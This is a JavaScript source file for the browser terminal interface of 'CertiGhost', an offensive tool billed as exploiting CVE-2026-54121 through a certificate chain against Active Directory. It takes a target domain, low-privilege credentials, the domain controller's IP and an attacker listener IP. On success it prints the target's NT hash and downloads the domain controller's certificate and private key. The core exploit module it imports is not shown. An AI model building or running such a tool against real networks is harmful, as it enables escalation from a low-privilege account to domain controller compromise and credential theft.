import { run, USAGE, EXAMPLE } from './certighost.js';

const $ = (id) => document.getElementById(id);
const term = $('term'), cmd = $('cmd'), ps = $('ps');

let busy = false;
const history = []; let histIdx = 0;

function print(text, cls = '') {
  for (const line of String(text).split('\n')) {
    const el = document.createElement('div');
    if (cls) el.className = cls;
    el.textContent = line;
    term.appendChild(el);
  }
  term.scrollTop = term.scrollHeight;
}

function parseArgs(line) {
  const tokens = line.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) || [];
  const flags = {};
  const positional = [];
  for (let i = 0; i < tokens.length; i++) {
    let t = tokens[i].replace(/^["']|["']$/g, '');
    if (t.startsWith('--')) {
      const key = t.slice(2);
      const next = tokens[i + 1];
      if (next && !next.startsWith('-')) { flags[key] = next.replace(/^["']|["']$/g, ''); i++; }
      else flags[key] = true;
    } else if (t.startsWith('-') && t.length === 2) {
      const key = t[1];
      const next = tokens[i + 1];
      if (next && !next.startsWith('-')) { flags[key] = next.replace(/^["']|["']$/g, ''); i++; }
      else flags[key] = true;
    } else {
      positional.push(t);
    }
  }
  return { flags, positional };
}

async function execute(line) {
  const trimmed = line.trim();
  if (!trimmed) return;

  print(`ghost# ${trimmed}`, 'cmd');
  history.push(trimmed); histIdx = history.length;

  if (trimmed === 'help' || trimmed === '-h' || trimmed === '--help') {
    print('CertiGhost — CVE-2026-54121 cdc-redirect chain');
    print('');
    print('Usage:');
    print(`  ${USAGE}`);
    print('');
    print('Options:');
    print('  -d, --domain      Target AD domain (FQDN)');
    print('  -u, --user        Low-priv username');
    print('  -p, --password    Password');
    print('  -H, --host        DC IP address');
    print('  --ca              CA name (auto-discovered if omitted)');
    print('  --ca-ip           CA IP (defaults to DC IP)');
    print('  --listener        Attacker IP for rogue servers (REQUIRED in practice)');
    print('  --target-san      Target DC sAMAccountName (auto-discovered)');
    print('  --template        Certificate template (default: Machine)');
    print('  --computer-name   Use existing computer account');
    print('  --computer-pass   Existing computer password');
    print('  --computer-hash   Existing computer NT hash');
    print('');
    print('Example:');
    print(`  ${EXAMPLE}`, 'muted');
    return;
  }

  if (trimmed === 'clear') { term.innerHTML = ''; return; }

  const { flags } = parseArgs(trimmed);

  const domain = flags.d || flags.domain;
  const user = flags.u || flags.user;
  const password = flags.p || flags.password;
  const dcIp = flags.H || flags.host;

  if (!domain || !user || !dcIp) {
    print(`Usage: ${USAGE}`, 'err');
    return;
  }

  try {
    const result = await run({
      domain, user, password, dcIp,
      caIp: flags['ca-ip'] || flags.caip || null,
      ca: flags.ca || null,
      listener: flags.listener || null,
      targetSan: flags['target-san'] || flags.target || null,
      template: flags.template || 'Machine',
      computerName: flags['computer-name'] || flags.computer || null,
      computerPass: flags['computer-pass'] || null,
      computerHash: flags['computer-hash'] || null,
    }, { log: (m) => print('  ' + m) });

    if (result.ok) {
      print(`[+] ${result.target}:${result.ntHash}`, 'ok');
      if (result.certPem) {
        downloadFile('dc-cert.crt', result.certPem);
        downloadFile('dc-cert.key', result.keyPem);
        print('[+] downloaded dc-cert.crt + dc-cert.key', 'ok');
      }
    }
  } catch (e) {
    print(`[-] ${e.message}`, 'err');
  }
}

function downloadFile(name, content) {
  const blob = new Blob([content], { type: 'application/octet-stream' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = name;
  a.click();
  URL.revokeObjectURL(a.href);
}

cmd.addEventListener('keydown', async (e) => {
  if (e.key === 'Enter' && !busy) {
    busy = true;
    ps.textContent = '...';
    cmd.disabled = true;
    const line = cmd.value;
    cmd.value = '';
    try { await execute(line); } catch (err) { print(`Error: ${err.message}`, 'err'); }
    busy = false;
    ps.textContent = 'ghost#';
    cmd.disabled = false;
    cmd.focus();
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (histIdx > 0) { histIdx--; cmd.value = history[histIdx]; }
  } else if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (histIdx < history.length - 1) { histIdx++; cmd.value = history[histIdx]; }
    else { histIdx = history.length; cmd.value = ''; }
  }
});

print('CertiGhost — CVE-2026-54121 cdc-redirect certificate chain', 'ok');
print('Type "help" for usage, or run certighost directly.');
print('');
